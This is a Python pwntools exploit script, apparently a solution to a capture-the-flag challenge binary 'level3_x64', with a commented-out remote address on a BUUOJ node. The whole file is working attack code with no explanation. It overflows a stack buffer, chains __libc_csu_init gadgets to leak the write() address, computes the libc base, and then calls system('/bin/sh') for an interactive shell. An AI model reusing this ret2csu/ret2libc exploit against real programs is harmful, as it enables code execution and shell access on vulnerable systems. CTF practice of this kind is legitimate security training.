from pwn import *

#context.log_level = 'debug'

p = process('./level3_x64')
#p = remote('node4.buuoj.cn', 25135)
elf = ELF('level3_x64')

write_got = elf.got['write']
write_plt = elf.plt['write']
vuln_addr = elf.sym['vulnerable_function']

csu_1 = 0x4006aa
csu_2 = 0x400690
pop_rdi_ret = 0x4006b3
ret = 0x400499

libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
#libc = ELF('libc-2.23.so')

#gdb.attach(p, 'b *0x4005e6')

p.recvuntil('\n')

payload = b'a' * ( 0x80 + 8 ) + p64(csu_1) + p64(0) + p64(1) + p64(write_got) + p64(8) + p64(write_got) + p64(1)
payload += p64(csu_2) + b'a' * ( 0x8 + 0x8 * 6 ) + p64(vuln_addr)

p.sendline(payload)

write_real_addr = u64(p.recv(8))

libc_base = write_real_addr - libc.sym['write']

print('[+] libc_base -> {}'.format(hex(libc_base)))

system_addr = libc_base + libc.sym['system']
bin_sh = libc_base + next(libc.search(b'/bin/sh'))

p.recvuntil('\n')

payload = b'a' * ( 0x80 + 8 ) + p64(ret) + p64(pop_rdi_ret) + p64(bin_sh) + p64(system_addr)

p.sendline(payload)

p.interactive()
